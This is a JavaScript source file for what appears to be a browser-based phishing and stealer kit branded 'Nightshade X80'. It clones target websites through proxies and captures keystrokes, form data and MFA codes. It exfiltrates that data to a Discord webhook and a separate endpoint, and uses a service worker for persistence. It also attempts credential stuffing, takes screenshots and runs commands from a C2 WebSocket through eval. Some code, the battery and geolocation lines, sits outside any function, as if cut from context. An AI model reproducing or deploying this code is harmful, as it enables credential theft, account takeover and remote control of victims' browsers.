// ==================== DISCORD RATE LIMITER ====================
let rateLimitQueue = [];
let rateLimitTimer = null;
let rateLimitRemaining = 5; // safe start
let rateLimitReset = Date.now();

async function discordExfil(embed) {
  return new Promise((resolve, reject) => {
    rateLimitQueue.push({ embed, resolve, reject });
    processQueue();
  });
}

function processQueue() {
  if (rateLimitTimer || rateLimitQueue.length === 0) return;
  const now = Date.now();
  if (rateLimitRemaining <= 0 && now < rateLimitReset) {
    rateLimitTimer = setTimeout(() => {
      rateLimitTimer = null;
      processQueue();
    }, rateLimitReset - now + 100);
    return;
  }
  const { embed, resolve } = rateLimitQueue.shift();
  sendDiscord(embed).then(resolve).catch(() => resolve()); // never block
}

async function sendDiscord(embed) {
  try {
    const res = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    rateLimitRemaining = parseInt(res.headers.get('x-ratelimit-remaining')) || 1;
    rateLimitReset = parseInt(res.headers.get('x-ratelimit-reset')) * 1000 || Date.now() + 1000;
    return true;
  } catch(e) {
    // rate limited; retry after 1s
    rateLimitRemaining = 0;
    rateLimitReset = Date.now() + 1000;
    return false;
  }
}

// ==================== CHUNKED EXFIL ====================
function chunkString(str, size = 1900) {
  const chunks = [];
  for (let i = 0; i < str.length; i += size) {
    chunks.push(str.substring(i, i + size));
  }
  return chunks;
}

async function exfilLarge(payload) {
  const json = JSON.stringify(payload, null, 2);
  const chunks = chunkString(json, 1900);
  for (let i = 0; i < chunks.length; i++) {
    const embed = {
      title: `X80 Exfil ${i+1}/${chunks.length}`,
      description: '```json\n' + chunks[i] + '\n```',
      color: 0xf72585,
      footer: { text: 'Nightshade X80' }
    };
    await discordExfil(embed);
    await sleep(500); // be gentle
  }
}

// ==================== SERVICE WORKER ====================
let serviceWorkerActive = false;
async function installServiceWorker() {
  if (!('serviceWorker' in navigator)) return false;
  try {
    const swCode = `
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));
self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.searchParams.has('x80')) {
    const t = u.searchParams.get('x80');
    e.respondWith(fetch(t, { mode:'no-cors' }).catch(() => new Response('', { status:500 })));
  }
});
self.addEventListener('message', e => {
  if (e.data?.type === 'exfil') {
    caches.open('x80').then(c => c.put('/exfil', new Response(JSON.stringify(e.data.payload))));
    fetch('${NIGHTSHADE_EXFIL}', {
      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(e.data.payload)
    }).catch(() => {});
  } else if (e.data?.type === 'flush') {
    caches.open('x80').then(async c => {
      const r = await c.match('/exfil');
      if (r) {
        const p = await r.json();
        fetch('${NIGHTSHADE_EXFIL}', { method:'POST', body:JSON.stringify(p) }).catch(() => {});
        c.delete('/exfil');
      }
    });
  }
});
`;
    const blob = new Blob([swCode], { type:'application/javascript' });
    const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
    await navigator.serviceWorker.ready;
    serviceWorkerActive = true;
    navigator.serviceWorker.controller?.postMessage({ type:'flush' });
    return true;
  } catch(e) { return false; }
}

// ==================== PROXY FETCH ====================
let proxyIndex = 0;
async function attemptProxyFetch(url) {
  try {
    const r = await fetch(NIGHTSHADE_PROXY? NIGHTSHADE_PROXY+encodeURIComponent(url) : url, { signal:AbortSignal.timeout(6000) });
    if(r.ok) return await r.text();
  } catch(e) {}
  if(serviceWorkerActive) {
    try {
      const r = await fetch(location.origin+location.pathname+'?x80='+encodeURIComponent(url), { signal:AbortSignal.timeout(8000) });
      if(r.ok) return await r.text();
    } catch(e) {}
  }
  for(let i=0;i<PUBLIC_PROXIES.length;i++) {
    const proxy = PUBLIC_PROXIES[(proxyIndex+i)%PUBLIC_PROXIES.length];
    try {
      const r = await fetch(proxy+encodeURIComponent(url), { signal:AbortSignal.timeout(8000) });
      if(r.ok) { proxyIndex=(proxyIndex+i)%PUBLIC_PROXIES.length; return await r.text(); }
    } catch(e) {}
    await sleep(jitter());
  }
  try {
    const r = await fetch(url, { mode:'no-cors', signal:AbortSignal.timeout(5000) });
    if(r.type==='opaque') throw new Error('Opaque');
    return await r.text();
  } catch(e) { throw new Error('All proxies failed'); }
}

  let battery=null; try { if(navigator.getBattery){ const b=await navigator.getBattery();battery={charging:b.charging,level:b.level}; } } catch(e){}
  let geo=null; try { geo=await new Promise(res=>{navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude,lng:p.coords.longitude}),()=>res(null),{timeout:3000});}); } catch(e){}
  let connection=null; if(navigator.connection)connection={type:navigator.connection.type,effectiveType:navigator.connection.effectiveType,downlink:navigator.connection.downlink,rtt:navigator.connection.rtt};
  let audioFp=null; try { const ctx=new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);const osc=ctx.createOscillator();osc.type='triangle';osc.frequency.value=1000;const ana=ctx.createAnalyser();osc.connect(ana);ana.connect(ctx.destination);osc.start(0);const buf=await ctx.startRendering();audioFp=Array.from(buf.getChannelData(0).slice(0,100)).map(v=>v.toFixed(4)).join(','); } catch(e){}

// ==================== AUTO‑SCRAPER ====================
function scrapeAll(doc){ if(!doc)return{};const d={texts:[],images:[],links:[],forms:[],meta:[]};
  const walker=document.createTreeWalker(doc.body,NodeFilter.SHOW_TEXT,null,false);while(walker.nextNode()){const t=walker.currentNode.nodeValue.trim();if(t)d.texts.push(t.substring(0,200));}
  doc.querySelectorAll('img').forEach(i=>d.images.push({src:i.src,alt:i.alt}));
  doc.querySelectorAll('a').forEach(a=>d.links.push({href:a.href,text:a.textContent.trim().substring(0,100)}));
  doc.querySelectorAll('form').forEach(f=>{const fd={action:f.action,method:f.method,inputs:[]};f.querySelectorAll('input,textarea,select').forEach(el=>fd.inputs.push({name:el.name,type:el.type,value:el.value}));d.forms.push(fd);});
  doc.querySelectorAll('meta').forEach(m=>d.meta.push({name:m.name||m.getProperty('property'),content:m.content}));
  return d;}

// ==================== KEYLOGGER & FORM HIJACK ====================
let keylogBuffer='';let collectedForms=[];
function startStealer(doc){
  doc.addEventListener('keydown',e=>{keylogBuffer+=e.key;if(keylogBuffer.length>100)maxExfil({forms:collectedForms});});
  setInterval(()=>{if(keylogBuffer)maxExfil({forms:collectedForms});},3000);
  doc.querySelectorAll('input,textarea,select').forEach(el=>{el.addEventListener('input',()=>{collectForms(doc);maxExfil({forms:collectedForms});});el.addEventListener('change',()=>{collectForms(doc);maxExfil({forms:collectedForms});});});
  const mo=new MutationObserver(()=>{doc.querySelectorAll('input[type="text"],[type="tel"],[type="number"]').forEach(i=>{if(!i.dataset.mfa){i.dataset.mfa='1';i.addEventListener('input',()=>maxExfil({mfa:i.value}));}});});
  mo.observe(doc.body,{childList:true,subtree:true});
}
function collectForms(doc){const forms=doc.querySelectorAll('form');collectedForms=[];forms.forEach((f,idx)=>{const fd=new FormData(f);const data={};for(const[k,v]of fd.entries())data[k]=v;collectedForms.push({id:f.id||`form_${idx}`,action:f.dataset.originalAction||'',data});});}

// ==================== CREDENTIAL STUFFING ====================
function generateMutatedPasswords(domain){const base=domain.split('.')[0];const mutations=[base,base+'123',base+'1234',base+'!',base+'@123','admin@'+base,'admin_'+base,base+'_admin',base.toUpperCase(),base+'2024',base+'2025','letmein'+base.slice(0,3)];return [...new Set([...COMMON_PASSWORDS,...mutations])];}
async function autoStuffCredentials(frameDoc){const forms=frameDoc.querySelectorAll('form');if(!forms.length)return;const form=forms[0];const inputs=form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');let userField=null,passField=null;for(const inp of inputs){const name=(inp.name||inp.placeholder||'').toLowerCase();if(name.includes('user')||name.includes('email')||name.includes('login'))userField=inp;if(name.includes('pass')||name.includes('pwd'))passField=inp;}if(!userField||!passField)return;const username=userField.value||'harvested@'+targetOrigin;const passwords=generateMutatedPasswords(targetOrigin);for(const pw of passwords){passField.value=pw;maxExfil({credential_stuffing:{username,pw}});await sleep(300);}}

let c2Socket=null;
function connectC2(){try{c2Socket=new WebSocket(C2_WS);c2Socket.onopen=()=>c2Socket.send(JSON.stringify({type:'register',uid:uid()}));c2Socket.onmessage=e=>{try{const cmd=JSON.parse(e.data);if(cmd.type==='cmd'){if(cmd.command==='screenshot')takeScreenshot().then(img=>maxExfil({screenshot:img}));else if(cmd.command==='cookies')maxExfil({cookies:document.cookie});else if(cmd.command.startsWith('exec:'))eval(cmd.command.replace('exec:',''));}}catch(e){}};c2Socket.onclose=()=>setTimeout(connectC2,5000);}catch(e){}}

// ==================== SCREENSHOT ====================
let html2canvasReady=false;
async function takeScreenshot(){if(!html2canvasReady){for(const src of HTML2CANVAS_CDNS){try{await new Promise((res,rej)=>{const s=document.createElement('script');s.src=src;s.onload=res;s.onerror=rej;document.head.appendChild(s);});html2canvasReady=true;break;}catch(e){}}if(!html2canvasReady)return null;}try{const frame=document.getElementById('cloneFrame');const doc=frame.contentDocument||frame.contentWindow.document;const canvas=await html2canvas(doc.body,{useCORS:true,allowTaint:true,logging:false});return canvas.toDataURL('image/png');}catch(e){return null;}}

// ==================== CLONE ENGINE ====================
let targetOrigin='';
function rewriteDoc(doc,baseUrl){
  doc.querySelectorAll('a[href]').forEach(a=>{const href=a.getAttribute('href');if(href&&!href.startsWith('javascript:')&&!href.startsWith('#')){a.href='javascript:void(0)';a.dataset.originalHref=new URL(href,baseUrl).href;a.addEventListener('click',navigateClone);}});
  doc.querySelectorAll('form').forEach(f=>{f.action='javascript:void(0)';f.dataset.originalAction=new URL(f.getAttribute('action')||'',baseUrl).href||baseUrl;f.addEventListener('submit',handleFormSubmit);});
  startStealer(doc);
}
async function navigateClone(e){e.preventDefault();const href=e.currentTarget.dataset.originalHref;if(href)await loadPage(href);}
async function handleFormSubmit(e){e.preventDefault();const form=e.target;const formData=new FormData(form);const action=form.dataset.originalAction;await maxExfil({forms:collectedForms});if(action){const method=(form.method||'GET').toUpperCase();let nextUrl=action;let fetchOpts={method,headers:{'Content-Type':'application/x-www-form-urlencoded'}};if(method==='POST')fetchOpts.body=new URLSearchParams(formData).toString();else{const u=new URL(action);for(const[k,v]of formData.entries())u.searchParams.append(k,v);nextUrl=u.href;}await loadPage(nextUrl,fetchOpts);}}
async function loadPage(url,fetchOpts={}){
  try{
    const html=await attemptProxyFetch(url);
    const parser=new DOMParser();
    const doc=parser.parseFromString(html,'text/html');
    rewriteDoc(doc,url);
    const frame=document.getElementById('cloneFrame');
    frame.contentDocument.open();
    frame.contentDocument.write('<!DOCTYPE html>'+doc.documentElement.outerHTML);
    frame.contentDocument.close();
    collectForms(frame.contentDocument);
    setTimeout(()=>autoStuffCredentials(frame.contentDocument),2000);
    await maxExfil({forms:collectedForms});
  }catch(e){
    const frame=document.getElementById('cloneFrame');
    frame.contentDocument.open();
    frame.contentDocument.write('<div style="padding:20px;color:red;">Load failed – retrying…</div>');
    frame.contentDocument.close();
    setTimeout(()=>loadPage(url,fetchOpts),3000);
  }
}
function startAutoRefresh(url){setInterval(async()=>{try{const html=await attemptProxyFetch(url);const parser=new DOMParser();const doc=parser.parseFromString(html,'text/html');rewriteDoc(doc,url);const frame=document.getElementById('cloneFrame');frame.contentDocument.open();frame.contentDocument.write('<!DOCTYPE html>'+doc.documentElement.outerHTML);frame.contentDocument.close();collectForms(frame.contentDocument);}catch(e){}},60000);}
